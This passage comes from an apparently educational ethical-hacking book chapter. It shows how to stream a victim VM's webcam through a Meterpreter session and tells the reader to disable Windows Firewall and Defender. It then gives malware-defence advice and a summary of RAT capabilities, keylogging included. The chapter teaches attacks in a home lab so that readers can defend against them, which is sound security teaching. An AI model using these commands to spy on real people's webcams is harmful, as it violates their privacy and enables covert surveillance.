			<p class="BodyFirst">If logging keystrokes wasn’t creepy enough for you, viewing a victim computer’s webcam should make you want to move to a remote island with no internet (or at least convince you to cover your webcam with a sticky note). Connecting a webcam to the Windows VM might not work, but even if you can’t try this attack yourself, it works reliably against real Windows computers with webcams. To proceed, you’ll need a webcam (the one built into your laptop or a USB webcam attached to your desktop) and the patience to rerun the entire hack a few times following the steps in the Warning just given.</p>
			<ol class="decimal">
				<li value="1">Check if your webcam appears under Devices<span class="MenuArrow">▶</span>Webcams on the Windows VM’s menu bar. If it does, select its name and skip ahead to step 6. Otherwise, we’ll need to connect your webcam to the VM.</li>
				<li value="2">Close the Windows VM and select <b>Power off the machine</b>.</li>
				<li value="3"><span epub:type="pagebreak" id="Page_69" title="69"/>In VirtualBox Manager, select the Windows VM and go to <b>Machine</b><span class="MenuArrow">▶</span><b>Settings</b> or <b>Machine</b><span class="MenuArrow">▶</span><b>Settings</b><span class="MenuArrow">▶</span><b>Ports</b> (on macOS). Select <b>USB</b> in the Settings menu and select the checkbox next to <b>Enable USB Controller</b>.</li>
				<li value="4">Restart the Windows VM. Go to the menu bar, select <b>Devices</b><span class="MenuArrow">▶</span><b>Webcams</b> or <b>Devices</b><span class="MenuArrow">▶</span><b>USB</b>, and select the name of your webcam.</li>
				<li value="5">Turn off the Windows VM’s Firewall and Defender. Then run the trojan again.</li>
				<li value="6">Enter <code class="bold">webcam_list</code> at the Meterpreter prompt in Kali to find out if the webcam is available. You should see something like this:
					<pre><code>meterpreter &gt; <code class="bold">webcam_list</code>
1: VirtualBox Webcam - Logitech HD Webcam C310 </code></pre>
					<p class="ListBody">My webcam is showing up as <code>VirtualBox Webcam - Logitech HD Webcam C310</code>, for example.</p>
					</li>
				<li value="7">Enter <code class="bold">webcam_stream</code> to connect to the webcam via Meterpreter.
					<pre><code>meterpreter &gt; <code class="bold">webcam_stream</code>
[*] Starting...
[*] Preparing player...
[*] Opening player at: /home/kali/KMKiGQxa.html
[*] Streaming...</code></pre>
					<p class="ListBody">Meterpreter will open Firefox and stream video from the Windows VM’s webcam, as shown in <a href="#figure6-9" id="figureanchor6-9">Figure 6-9</a>.</p>
					</li>
			</ol>
			<figure>
				<img alt="f06009" class="" src="image_fi/502000c06/f06009.png"/>
				<figcaption>
					<p><a id="figure6-9">Figure 6-9</a>: The webcam stream shows me and the bookshelf in my office.</p>
				</figcaption>
			</figure>
			<p><span epub:type="pagebreak" id="Page_70" title="70"/>You should see your webcam’s LED light up, showing that the camera is active. Unlike the <code>screenshare</code> and <code>keyscan</code> commands, the webcam hack lets you know someone’s spying on you. If your webcam light is ever on when you’re not using it, run a <em>thorough</em> antivirus scan and reboot your computer to see if the light turns off. However, don’t rely on the webcam LED: some advanced hacks enable spying through the webcam <em>without turning on</em> the LED. That’s why it’s important to practice the safety measures described in the next section.</p>
			<p>
				To stop streaming video from the Windows 10 VM’s webcam, close Firefox and press <span class="KeyCaps">CTRL</span>-C in the Meterpreter window to interrupt the <code>webcam_stream</code> command. Then grab a sticky note or a piece of masking tape and cover the webcam on your laptop!</p>
			<h2 id="h1-502000c06-0004">Defending Against Malware</h2>
			<p class="BodyFirst">As you’ve seen in this chapter, viruses are incredibly easy to create and distribute. Any suspicious email attachment, link, web page, app, or video that you receive or open could contain malware waiting to be launched. Attackers don’t even need a lot of skill; they just need to use Metasploit and trick people into downloading the virus. Once a computer is infected, the attacks an unethical hacker can use against it are downright frightening.</p>
			<p>Your best defenses are the following:</p>
			<ol class="none">
				<li><span class="RunInHead">Update software often.</span>  Update your operating system and applications, from your word processor and web browser to your PDF reader—at least monthly. Pick a certain day of the month, like the 1st, 15th, or 30th, and mark your calendar to update your devices and all applications. Think of it as another must-do task, like paying bills or mowing the lawn. Most of the 2,000+ exploits in Kali attack older versions of software, so you’ll be less vulnerable to an attack if you keep the latest security patches installed for the software you use.</li>
				<li><span class="RunInHead">Use a firewall and antivirus software.</span>  Keep your firewall turned on and update your antivirus software regularly. There are several free and low-cost antivirus tools out there. Research which ones stop the most malware and then update your antivirus tool weekly, or turn on automatic updates, to give it the best shot at protecting you.</li>
				<li><span class="RunInHead">Think before you click.</span>  Malware can be launched through infected program files, bootlegged videos, or even Office documents and PDFs. Peer-to-peer file-sharing sites are filled with “free” malware-infected files, waiting for unsuspecting victims. Run VirusTotal or another virus scan on <em>any</em> files from sources you don’t trust and don’t download suspicious or illegal files at all.</li>
			</ol>
			<p>
				These measures won’t make you invincible, but they’ll help you avoid most malware-based attacks, and they’ll make you a difficult enough target that most hackers will move on to other victims. Most attacks rely on the concept of <em>low-hanging fruit</em>—easy opportunities for a malicious hacker to break into your system, such as out-of-date software, a disabled firewall or <span epub:type="pagebreak" id="Page_71" title="71"/>antivirus program, or a user who opens links or downloads files without scanning them first. Unfortunately, there is enough low-hanging fruit to keep hackers busy, so taking a few smart precautions like these can keep you safe from more than 90 percent of attacks.</p>
			<p>Oh . . . and cover that webcam when you’re not using it!</p>
			<h2 id="h1-502000c06-0005">The Takeaway</h2>
			<p class="BodyFirst">In this chapter, you learned how attackers create malware and how easily an unprotected computer can be infected. Using the Metasploit framework, you created a Meterpreter remote-access trojan (RAT), a special kind of malware that gives an attacker control of your computer from anywhere in the world as long as they have an internet connection. You shared your malware across a network by turning on the Apache web server in your Kali Linux VM and placing the trojan in a shared web folder. Then you downloaded the malware onto your Windows VM and opened the file to infect your machine.</p>
			<p>Next, you took control of the Windows VM from the Meterpreter remote shell in Kali. You learned how an attacker can upload and download files, steal screenshots, log keystrokes, and spy through a webcam using only a command or two. For most of the attacks, your Windows VM didn’t even show it was being hacked.</p>
			<p>Finally, you learned how to prevent many malware-based attacks. Avoiding suspicious downloads, links, and websites; keeping your firewall and antivirus software turned on and current; and regularly updating your operating system and applications are important precautions. If you employ multiple layers of security, you are a much more difficult target, and most attackers will move on to easier prey.</p>
			<p>In the next chapter, we’ll take our skills one level higher and see how unethical hackers use Meterpreter and other tools to steal and crack passwords.</p>
		</section>
	</body>
</html>